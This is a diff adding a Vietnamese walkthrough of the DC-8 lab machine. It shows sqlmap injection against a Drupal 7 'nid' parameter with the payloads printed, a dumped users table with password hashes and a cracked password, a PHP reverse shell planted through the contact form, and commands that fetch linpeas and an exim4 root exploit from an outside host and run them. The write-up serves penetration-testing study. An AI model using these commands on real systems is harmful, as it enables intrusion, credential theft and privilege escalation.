@@ -2356,19 +2356,296 @@ Vi còn cron này được lên lịch cứ 15p thì sẽ thực hiện chạy b
 arp-scan -l
 ```
 
-![alt text](IMG/DC-7/image-23.png)
+![alt text](IMG/DC-8/image.png)
 
 ```bash
 sudo ./Recon.sh
-# 172.16.1.132
+# 172.16.1.133
 ```
 
-![alt text](IMG/DC-7/image.png)
+![alt text](IMG/DC-8/image-1.png)
 
-![alt text](IMG/DC-7/image-2.png)
 
 Dựa vào kết quả ta thu được các thông tin hữu ích sau:
 
 ```bash
-CMS: Drupal 8 
+CMS: Drupal 7
 ```
+
+Ta truy cập giao diện web:
+
+![alt text](IMG/DC-8/image-2.png)
+
+Khi ta đến trang web thì đầu tiên là trang chào mừng, chúng ta thấy trên url của nó được lấy từ mẫu, với `nid=1`. đây là một dấu hiệu cho thấy chúng ta có một số khả năng tấn công băng SQL Injection
+
+## SQLmap
+
+```bash
+sqlmap -u 'http://172.16.1.133/?nid=1'
+```
+
+![alt text](IMG/DC-8/image-3.png)
+
+![alt text](IMG/DC-8/image-4.png)
+
+Như vậy sqlmap đã quét ra và nhận thấy tham số nid là một tham số yếu có thể bị tấn công.
+
+Chúng ta thêm dạng tùy chọn dbs để lấy hoặc truy vấn dữ liệu.
+
+```bash
+sqlmap -u 'http://172.16.1.133/?nid=1' --dbs
+```
+
+![alt text](IMG/DC-8/image-5.png)
+
+có hai database là `d7db` và `information_schema`. Ta liệt kê các bảng trong database d7db.
+
+```bash
+sqlmap -u 'http://172.16.1.133/?nid=1' -D d7db --tables
+```
+
+Có rất nhiều bảng nhưng bảng quan trọng nhất là bản `user`.
+
+```bash
++-----------------------------+
+| block                       |
+| cache                       |
+| filter                      |
+| history                     |
+| role                        |
+| system                      |
+| actions                     |
+| authmap                     |
+| batch                       |
+| block_custom                |
+| block_node_type             |
+| block_role                  |
+| blocked_ips                 |
+| cache_block                 |
+| cache_bootstrap             |
+| cache_field                 |
+| cache_filter                |
+| cache_form                  |
+| cache_image                 |
+| cache_menu                  |
+| cache_page                  |
+| cache_path                  |
+| cache_views                 |
+| cache_views_data            |
+| ckeditor_input_format       |
+| ckeditor_settings           |
+| ctools_css_cache            |
+| ctools_object_cache         |
+| date_format_locale          |
+| date_format_type            |
+| date_formats                |
+| field_config                |
+| field_config_instance       |
+| field_data_body             |
+| field_data_field_image      |
+| field_data_field_tags       |
+| field_revision_body         |
+| field_revision_field_image  |
+| field_revision_field_tags   |
+| file_managed                |
+| file_usage                  |
+| filter_format               |
+| flood                       |
+| image_effects               |
+| image_styles                |
+| menu_custom                 |
+| menu_links                  |
+| menu_router                 |
+| node                        |
+| node_access                 |
+| node_revision               |
+| node_type                   |
+| queue                       |
+| rdf_mapping                 |
+| registry                    |
+| registry_file               |
+| role_permission             |
+| search_dataset              |
+| search_index                |
+| search_node_links           |
+| search_total                |
+| semaphore                   |
+| sequences                   |
+| sessions                    |
+| shortcut_set                |
+| shortcut_set_users          |
+| site_messages_table         |
+| taxonomy_index              |
+| taxonomy_term_data          |
+| taxonomy_term_hierarchy     |
+| taxonomy_vocabulary         |
+| url_alias                   |
+| users                       |
+| users_roles                 |
+| variable                    |
+| views_display               |
+| views_view                  |
+| watchdog                    |
+| webform                     |
+| webform_component           |
+| webform_conditional         |
+| webform_conditional_actions |
+| webform_conditional_rules   |
+| webform_emails              |
+| webform_last_download       |
+| webform_roles               |
+| webform_submissions         |
+| webform_submitted_data      |
++-----------------------------+
+```
+
+Truy cập URL mục tiêu, nhắm vào database d7db, chọn bảng users, rồi dump dữ liệu trong bảng đó ra.
+
+```bash
+sqlmap -u 'http://172.16.1.133/?nid=1' -D d7db -T users --dump
+```
+
+```bash
+[18:51:25] [INFO] resuming back-end DBMS 'mysql'
+[18:51:25] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: nid (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: nid=1 AND 9758=9758
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: nid=1 AND (SELECT 1701 FROM(SELECT COUNT(*),CONCAT(0x7170766b71,(SELECT (ELT(1701=1701,1))),0x71706b7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: nid=1 AND (SELECT 2161 FROM (SELECT(SLEEP(5)))pGWI)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: nid=-5408 UNION ALL SELECT CONCAT(0x7170766b71,0x5a52575a6a777a47557166434b504e774f795a6f4d4e6946567072534d64426b634b7a6344464b73,0x71706b7071)-- -
+---
+[18:51:26] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+[18:51:26] [INFO] fetching columns for table 'users' in database 'd7db'
+[18:51:26] [WARNING] reflective value(s) found and filtering out
+[18:51:26] [WARNING] potential permission problems detected ('command denied')
+[18:51:26] [INFO] retrieved: 'uid','int(10) unsigned'
+[18:51:45] [INFO] retrieved: 'name','varchar(60)'
+[18:51:26] [INFO] retrieved: 'pass','varchar(128)'
+[18:51:26] [INFO] retrieved: 'mail','varchar(254)'
+[18:51:26] [INFO] retrieved: 'theme','varchar(255)'
+[18:51:26] [INFO] retrieved: 'signature','varchar(255)'
+[18:51:26] [INFO] retrieved: 'signature_format','varchar(255)'
+[18:51:26] [INFO] retrieved: 'created','int(11)'
+[18:51:26] [INFO] retrieved: 'access','int(11)'
+[18:51:26] [INFO] retrieved: 'login','int(11)'
+[18:51:26] [INFO] retrieved: 'status','tinyint(4)'
+[18:51:26] [INFO] retrieved: 'timezone','varchar(32)'
+[18:51:26] [INFO] retrieved: 'language','varchar(12)'
+[18:51:26] [INFO] retrieved: 'picture','int(11)'
+[18:51:26] [INFO] retrieved: 'init','varchar(254)'
+[18:51:26] [INFO] retrieved: 'data','longblob'
+[18:51:26] [INFO] fetching entries for table 'users' in database 'd7db'
+[18:51:26] [INFO] retrieved: ' ','','','0','0','0','','0','','','0','',' ','',' ','0'
+[18:51:26] [INFO] retrieved: 'a:2:{s:7:"contact";i:0;s:7:"overlay";i:1;}','','admin','1','1567766818','1567489015','dc8blah@dc8blah.org','1567766626','dcau-user@outlook.com','$...
+[18:51:26] [INFO] retrieved: 'a:5:{s:16:"ckeditor_default";s:1:"t";s:20:"ckeditor_show_toggle";s:1:"t";s:14:"ckeditor_width";s:4:"100%";s:13:"ckeditor_lang";s:2:"en";s:18:"cked...
+Database: d7db
+Table: users
+[3 entries]
++-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+
+| uid | init                | mail                  | pass                                                    | login      | theme   | data                                                                                                                                                                        | name    | access     | created    | picture | status   | timezone           | signature | language   | signature_format |
++-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+
+| 0   | <blank>             | <blank>               | <blank>                                                 | 0          | <blank> | NULL                                                                                                                                                                        | <blank> | 0          | 0          | 0       | 0        | NULL               | <blank>   | <blank>    | NULL             |
+| 1   | dc8blah@dc8blah.org | dcau-user@outlook.com | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z | 1567766626 | <blank> | a:2:{s:7:"contact";i:0;s:7:"overlay";i:1;}                                                                                                                                  | admin   | 1567766818 | 1567489015 | 0       | 1        | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
+| 2   | john@blahsdfsfd.org | john@blahsdfsfd.org   | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF | 1567497783 | <blank> | a:5:{s:16:"ckeditor_default";s:1:"t";s:20:"ckeditor_show_toggle";s:1:"t";s:14:"ckeditor_width";s:4:"100%";s:13:"ckeditor_lang";s:2:"en";s:18:"ckeditor_auto_lang";s:1:"t";} | john    | 1567498512 | 1567489250 | 0       | 1        | Australia/Brisbane | <blank>   | <blank>    | filtered_html    |
++-----+---------------------+-----------------------+---------------------------------------------------------+------------+---------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------+---------+------------+------------+---------+----------+--------------------+-----------+------------+------------------+
+
+[18:51:26] [INFO] table 'd7db.users' dumped to CSV file '/root/.local/share/sqlmap/output/172.16.1.133/dump/d7db/users.csv'
+[18:51:26] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 2 times
+[18:51:26] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.16.1.133'
+[18:51:26] [WARNING] your sqlmap version is outdated
+
+[*] ending @ 18:51:26 /2026-04-07/
+```
+
+Như vậy chúng ta thu được mail, tên và password dạng hash của các người dùng.
+
+```bash
+admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
+john | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
+```
+
+Tiếp theo ta sẽ sử dụng john đê thực hiện bẻ khóa mật khẩu:
+
+```bash
+nano pass-hash
+$S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
+$S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
+```
+
+Như vậy ta crack thành công được mật khẩu của `john` là `turtle`.
+
+![alt text](IMG/DC-8/image-6.png)
+
+![alt text](IMG/DC-8/image-7.png)
+
+## REVERSE SHELL
+
+![alt text](IMG/DC-8/image-8.png)
+
+![alt text](IMG/DC-8/image-9.png)
+
+Chuẩn bị shell php.
+
+![alt text](IMG/DC-8/image-10.png)
+
+Xong ta sẽ ra trang web chính để thực hiện điền một contact us và gửi lúc này hệ thống sẽ tự động thực thi file php ta vừa thêm như một lời cảm ơn.
+
+![alt text](IMG/DC-8/image-11.png)
+
+Lúc này ta sẽ nhận được một phiên kết nối tới:
+
+![alt text](IMG/DC-8/image-12.png)
+
+## ROOT FLAG
+
+để dẽ dàng trong việc thu thập thông tin cua hệ thống thì ta sẽ cài `linpeas.sh`.
+
+```bash
+cd /tmp
+wget http://172.16.1.128:8000/linpeas.sh
+chmod +x linpeas.sh
+./linpeas.sh
+```
+
+![alt text](IMG/DC-8/image-13.png)
+
+Đây là phần output của linpeas đang liệt kê các file có quyền đặc biệt trên Linux, chủ yếu là SUID files.
+
+Trong các lệnh ở đây ta chú ý tới lệnh `exim4`. Chúng ta xem phiên bản và thực hiện search exploit của lệnh này ở trên mạng và ta thấy có explit cho phép leo thang đặc quyền.
+
+![alt text](IMG/DC-8/image-14.png)
+
+![alt text](IMG/DC-8/image-15.png)
+
+```bash
+sudo wget https://www.exploit-db.com/download/46996
+sed -i 's/\r$//' 46996.sh
+```
+
+Trên máy chủ:
+
+```bash
+wget http://172.16.1.128:8000/46996.sh
+chmod +x 46996.sh
+./46996.sh -m netcat
+```
+
+![alt text](IMG/DC-8/image-16.png)
+
+![alt text](IMG/DC-8/image-17.png)
